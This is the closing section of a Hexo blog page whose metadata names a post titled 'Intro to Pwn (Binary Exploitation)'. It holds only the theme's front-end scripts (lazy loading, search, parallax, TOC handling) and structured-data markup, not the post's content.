        volantis.js("/en/js/plugins/tags/friends.js")
      }
    
    
      const contributors_api = document.getElementById('contributors-api');
      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
        volantis.js("/en/js/plugins/tags/contributors.js")
      }
    
  };
  loadIssuesJS()
</script>




  <script defer src="https://unpkg.com/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: ["#"],
	maxRPS: 6,
	hoverDelay: 0
  };
</script>
<script defer src="https://unpkg.com/volantis-static@0.0.1660614606622/libs/flying-pages/flying-pages.min.js"></script>













  <script defer src="https://npm.onmicrosoft.cn/penndu@16.0.0/bsz.js"></script>


<!-- optional -->

  <script>
  async function loadSearchScript() {
    
        
    
    return volantis.js("/en/js/search/hexo.js");
  }

  function loadSearchService() {
    loadSearchScript();
    document.querySelectorAll(".input.u-search-input").forEach((e) => {
      e.removeEventListener("focus", loadSearchService, false);
    });

    document.querySelectorAll(".u-search-form").forEach((e) => {
      e.addEventListener("submit", (event) => {
        event.preventDefault();
      }, false);
    });
  }

  // 打开并搜索 字符串 s
  function OpenSearch(s) {
    if (typeof SearchService === 'undefined')
      loadSearchScript().then(() => {
        SearchService.setQueryText(s);
        SearchService.search();
      });
    else {
      SearchService.setQueryText(s);
      SearchService.search();
    }
  }

  // 访问含有 ?s=xxx  的链接时打开搜索 // 与搜索引擎 structured data 相关: /scripts/helpers/structured-data/lib/config.js
  if (window.location.search && /^\?s=/g.test(window.location.search)) {
    let queryText = decodeURI(window.location.search)
      .replace(/\ /g, "-")
      .replace(/^\?s=/g, "");
    OpenSearch(queryText);
  }

  // 搜索输入框获取焦点时加载搜索
  document.querySelectorAll(".input.u-search-input").forEach((e) => {
    e.addEventListener("focus", loadSearchService, false);
  });
</script>







  <script>



  function p_highlightjs_copyCode(){
    if (!(document.querySelector(".highlight .code pre") ||
      document.querySelector(".article pre code"))) {
      return;
    }
    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
  }
  volantis.requestAnimationFrame(p_highlightjs_copyCode)

</script>








  <script>
  let imgs = ["/background/wallhaven-jewjp5_2560x1080.png"];
  let index = 0;
  let IntervalParallax = null;

  function parallax(){
    let ParallaxWindow = document.querySelector("#parallax-window");
    
      ParallaxWindow = document.querySelector("html");
    
    Parallax.window = ParallaxWindow;
    Parallax.options.fade = 1500;
    Parallax.cache = 1;
    next_parallax();
    Parallax.init();
    if (imgs.length>1) {
      IntervalParallax = setInterval(function () {
        next_parallax();
      }, '31536000000');
    }
  }

  function next_parallax() {
    if (typeof Parallax == "undefined") {
      return
    }
    
    if (imgs.length>=1) {
      Parallax.options.src = imgs[index % imgs.length];
      Parallax.start();
      index++;
      if (Parallax.cache) {
        fetch(imgs[index % imgs.length] +"?t=" + new Date().getTime());
        if (index == imgs.length) {
          Parallax.cache = 0;
        }
      }
    }
  }
  var runningOnBrowser = typeof window !== "undefined";
  var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
  if (!isBot) {
    volantis.js('/en/js/plugins/parallax.js').then(()=>{
      parallax()
    })
  }
</script>




  <script>
  function load_swiper() {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    volantis.css("https://unpkg.com/swiper@11.1.14/swiper-bundle.min.css");
    volantis.js("https://unpkg.com/swiper@11.1.14/swiper-bundle.min.js").then(() => {
      p_swiper();
    });
  }

  load_swiper();

  function p_swiper() {
    volantis.swiper = new Swiper('.swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
    });
  }

</script>



  <script>
  volantis.css("https://unpkg.com/pace-js@1.2.4/themes/blue/pace-theme-minimal.css");
  volantis.js("https://unpkg.com/pace-js@1.2.4/pace.min.js").then(() => {
    Pace.options.restartOnPushState = false;
    // 阅读进度
    volantis.scroll.push(() => {
      Pace.stop();
      Pace.trigger('start');
      Pace.bar.update(volantis.scroll.progress() * 100);
      document.body.className = document.body.className.replaceAll("pace-running ","");
    },"阅读进度")
    // todo：配置项开关, 哪些页面添加阅读进度
  })
</script>




<script>
  function listenSidebarTOC() {
    const navItems = document.querySelectorAll(".toc li");
    if (!navItems.length) return;
    const targets = []
    const sections = Array.from(navItems).forEach((element) => {
      const link = element.querySelector(".toc-link");
      const target = document.getElementById(
        link.getAttribute("href") ? decodeURI(link.getAttribute("href")).replace("#", "") : link.getAttribute("toc-action").split("toc-")[1] // 兼容 hexo-blog-encrypt
      );
      targets.push(target)
      // 解除 a 标签 href 的 锚点定位, a 标签 href 的 锚点定位 会随机启用?? 产生错位???
      if (link.getAttribute("href")) {
        link.setAttribute("toc-action", "toc-" + decodeURI(link.getAttribute("href")).replace("#", ""))
        link.removeAttribute("href")
      }
      // 配置 点击 触发新的锚点定位
      if (target && target.id) {
        link.addEventListener("click", (event) => {
          event.preventDefault();
          // 这里的 addTop 是通过错位使得 toc 自动展开.
          volantis.scroll.to(target, { addTop: 5, observer: true })
          // Anchor id
          history.pushState(null, document.title, "#" + target.id);
        });
      }
      return target;
    });

    function activateNavByIndex(target) {
      if (target.classList.contains("active-current")) return;

      document.querySelectorAll(".toc .active").forEach((element) => {
        element.classList.remove("active", "active-current");
      });
      target.classList.add("active", "active-current");
      let parent = target.parentNode;
      while (!parent.matches(".toc")) {
        if (parent.matches("li")) parent.classList.add("active");
        parent = parent.parentNode;
      }
    }

    // 方案一：
    volantis.activateNavIndex = 0
    activateNavByIndex(navItems[volantis.activateNavIndex])
    if (targets[0]) {
      volantis.scroll.push(() => {
        if (targets[0].getBoundingClientRect().top >= 0) {
          volantis.activateNavIndex = 0
        } else if (targets[targets.length - 1].getBoundingClientRect().top < 0) {
          volantis.activateNavIndex = targets.length - 1
        } else {
          for (let index = 0; index < targets.length; index++) {
            const target0 = targets[index];
            const target1 = targets[(index + 1) % targets.length];
            if (target0.getBoundingClientRect().top < 0 && target1.getBoundingClientRect().top >= 0) {
              volantis.activateNavIndex = index
              break;
            }
          }
        }
        activateNavByIndex(navItems[volantis.activateNavIndex])
      })
    }

    // 方案二：
    // IntersectionObserver 不是完美精确到像素级别 也不是低延时性的
    // function findIndex(entries) {
    //   let index = 0;
    //   let entry = entries[index];
    //   if (entry.boundingClientRect.top > 0) {
    //     index = sections.indexOf(entry.target);
    //     return index === 0 ? 0 : index - 1;
    //   }
    //   for (; index < entries.length; index++) {
    //     if (entries[index].boundingClientRect.top <= 0) {
    //       entry = entries[index];
    //     } else {
    //       return sections.indexOf(entry.target);
    //     }
    //   }
    //   return sections.indexOf(entry.target);
    // }
    // function createIntersectionObserver(marginTop) {
    //   marginTop = Math.floor(marginTop + 10000);
    //   let intersectionObserver = new IntersectionObserver(
    //     (entries, observe) => {
    //       let scrollHeight = document.documentElement.scrollHeight;
    //       if (scrollHeight > marginTop) {
    //         observe.disconnect();
    //         createIntersectionObserver(scrollHeight);
    //         return;
    //       }
    //       let index = findIndex(entries);
    //       activateNavByIndex(navItems[index]);
    //     }, {
    //       rootMargin: marginTop + "px 0px -100% 0px",
    //       threshold: 0,
    //     }
    //   );
    //   sections.forEach((element) => {
    //     element && intersectionObserver.observe(element);
    //   });
    // }
    // createIntersectionObserver(document.documentElement.scrollHeight);
  }

  document.addEventListener("DOMContentLoaded", () => {
    volantis.requestAnimationFrame(listenSidebarTOC)
  });
</script>





<script>
  document.onreadystatechange = function () {
    if (document.readyState == 'complete') {
      // 页面加载完毕 样式加载失败，或是当前网速慢，或是开启了省流模式
      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
        document.querySelectorAll(".reveal").forEach(function (e) {
          e.style["opacity"] = "1";
        });
        document.querySelector("#safearea").style["display"] = "block";
      }
    }
  }
</script>


  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://archer-baiyi.github.io/en/en/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/en/en/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/en/en/categories/CTF/Pwn/","name":"Pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"https://archer-baiyi.github.io/en/en/2025/05/12/CTF/Pwn/Pwn入门/","name":"Intro to Pwn (Binary Exploitation)"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","keywords":null,"description":"hi","author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://archer-baiyi.github.io/en?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"Intro to Pwn (Binary Exploitation)","description":"Introduction to Pwn","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/"},"author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","wordCount":19,"datePublished":"2025-05-12T15:01:08.000Z","dateModified":"2026-02-25T05:57:18.917Z","articleSection":"CTF","keywords":"Pwn","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>




    </div>
    
    <script>
      (function() {
        // 定义修复核心逻辑
        function checkAndFixTOC() {
          var tocDiv = document.getElementById('toc-div');
          
          if (tocDiv) {
            // 1. 检查 TOC 里面是不是真的有内容（防止把空目录显示出来）
            var tocList = tocDiv.querySelector('ol.toc');
            var hasContent = tocList && tocList.children.length > 0;
            
            // 2. 如果有内容，但被隐藏了 (display: none)，则强制显示
            // 这里检查内联样式 style.display，因为它优先级最高
            if (hasContent && tocDiv.style.display === 'none') {
              console.log('Volantis Fix: 检测到目录被误杀，正在强制复活...');
              
              // 使用 cssText 赋予最高优先级 !important
              tocDiv.style.cssText = "display: block !important; opacity: 1 !important; visibility: visible !important;";
              
              // 3. 告诉主题重新计算布局（防止侧边栏塌陷）
              window.dispatchEvent(new Event('resize'));
              window.dispatchEvent(new Event('scroll'));
              
              // 4. 重启目录高亮监听
              if (typeof listenSidebarTOC === 'function') {
                listenSidebarTOC();
              }
            }
          }
        }

        // 策略 A: 监听解密事件 (依然保留，作为第一道防线)
        window.addEventListener('hexo-blog-encrypt:success', function() {
          checkAndFixTOC();
          setTimeout(checkAndFixTOC, 200); // 补刀
        });

        // 策略 B: 暴力轮询 (每 1 秒检查一次，作为终极防线)
        // 只要你在当前页面，这个定时器就会一直巡逻，确保目录不会莫名其妙消失
        setInterval(checkAndFixTOC, 1000);
        
      })();
    </script>
    </body>
</html>